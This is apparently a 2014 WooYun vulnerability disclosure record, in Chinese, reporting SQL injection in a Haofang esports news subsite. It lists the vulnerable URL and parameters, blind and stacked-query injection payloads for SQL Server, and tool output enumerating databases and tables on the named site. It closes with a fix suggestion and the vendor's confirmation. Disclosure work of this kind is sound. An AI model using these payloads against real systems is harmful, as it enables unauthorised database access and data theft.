{"id": 39, "wybug_id": "wooyun-2014-077662", "wybug_title": "浩方电竞平台分站sql注入漏洞", "wybug_corp": "边锋网络", "wybug_author": "xyang", "wybug_date": "2014-09-29 19:00", "wybug_open_date": "2014-11-13 19:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向公众公开  简要描述： 某国内大型电竞平台分站sql注入 详细说明：  最开始玩DOTA就是在浩方上玩的：）漏洞地址：\nhttp://news.cga.com.cn/app/list.aspx?ItemId=13&categoryid=4\n注入参数：\nItemID,categoryid\npayload:\n---Place: GETParameter: ItemId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ItemId=13) AND 6213=6213 AND (2258=2258&categoryid=4    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ItemId=13); WAITFOR DELAY '0:0:5'--&categoryid=4    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ItemId=13) WAITFOR DELAY '0:0:5'--&categoryid=4Place: GETParameter: categoryid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ItemId=13&categoryid=4) AND 9641=9641 AND (4531=4531    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ItemId=13&categoryid=4); WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ItemId=13&categoryid=4) WAITFOR DELAY '0:0:5'-----there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: categoryid, type: Unescaped numeric (default)[1] place: GET, parameter: ItemId, type: Unescaped numeric[q] Quit\n当前库信息：\n[03:16:39] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[03:16:39] [INFO] fetching current user[03:16:39] [INFO] resumed: UnionNewWebDBUsercurrent user:    'UnionNewWebDBUser'[03:16:39] [INFO] fetching current database[03:16:39] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[03:16:39] [INFO] retrieved: [03:16:39] [WARNING] reflective value(s) found and filtering outUnionNewscurrent database:    'UnionNews'\n服务器banner信息：\nbanner:---Microsoft SQL Server 2008 R2 (SP1) - 10.50.2500.0 (X64) \tJun 17 2011 00:54:03 \tCopyright (c) Microsoft Corporation\tEnterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)---\n跑库：\navailable databases [28]:[*] DntForum[*] HF_Maps[*] HF_Match[*] HFActivity[*] HFAwardSys[*] HFClanSys[*] HFEvent2013[*] HFEvent2013Apr[*] HFGoldenLeague[*] HFHelpSys[*] HFNetBar[*] HFReportComplain[*] HFWebApp[*] HFZhanLing[*] JDDB[*] ManagementSystem[*] master[*] model[*] msdb[*] Nest[*] pv[*] QuestionnaireSys[*] RencunBeckon[*] RencunDIY[*] RencunGift[*] tempdb[*] UnionNews[*] Woool2WebDB\n跑表\n[03:40:54] [INFO] retrieved: dbo.Admin[03:41:25] [INFO] retrieved: dbo.Admin_Category[03:42:05] [INFO] retrieved: dbo.Admin_Item[03:42:29] [INFO] retrieved: dbo.Admin_Permission[03:43:10] [INFO] retrieved: dbo.Admin_Tag[03:43:28] [INFO] retrieved: dbo.Admin_Template[03:44:04] [INFO] retrieved: dbo.AspNet_SqlCacheTablesForChangeNotification[03:46:28] [INFO] retrieved: dbo.Category[03:47:05] [INFO] retrieved: dbo.comd_list[03:47:40] [INFO] retrieved: dbo.Item[03:47:59] [INFO] retrieved: dbo.jiaozhu[03:48:30] [INFO] retrieved: dbo.lunhui[03:48:57] [INFO] retrieved: dbo.News[03:49:18] [INFO] retrieved: dbo.News_Comment[03:49:49] [INFO] retrieved: dbo.News_v[03:50:00] [INFO] retrieved: dbo.Pic[03:50:16] [INFO] retrieved: dbo.Reg_Arrt[03:50:45] [INFO] retrieved: dbo.Tag[03:51:01] [INFO] retrieved: dbo.Template[03:51:29] [INFO] retrieved: dbo.Vote[03:51:44] [INFO] retrieved: dbo.Vote_items[03:52:13] [INFO] retrieved: dbo.Vote_logsDatabase: UnionNews[22 tables]+--------------------------------------------+| Admin                                      || Admin_Category                             || Admin_Item                                 || Admin_Permission                           || Admin_Tag                                  || Admin_Template                             || AspNet_SqlCacheTablesForChangeNotification || Category                                   || Item                                       || News                                       || News_Comment                               || News_v                                     || Pic                                        || Reg_Arrt                                   || Tag                                        || Template                                   || Vote                                       || Vote_items                                 || Vote_logs                                  || comd_list                                  || jiaozhu                                    || lunhui                                     |+--------------------------------------------+\n   漏洞证明：  好多数据表不知道干嘛的。。。继续深入下去会影响到平台玩家吗？好激动，不深入了我只是想知道挖掘机技术到底哪家强？   修复方案：  参数类型增加判断、过滤：）   版权声明：转载请注明来源 xyang@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-30 08:52 厂商回复： 谢谢xyang的漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-29 10:22 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  我说我的cs账号怎么被人盗了，终于找到你了……    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}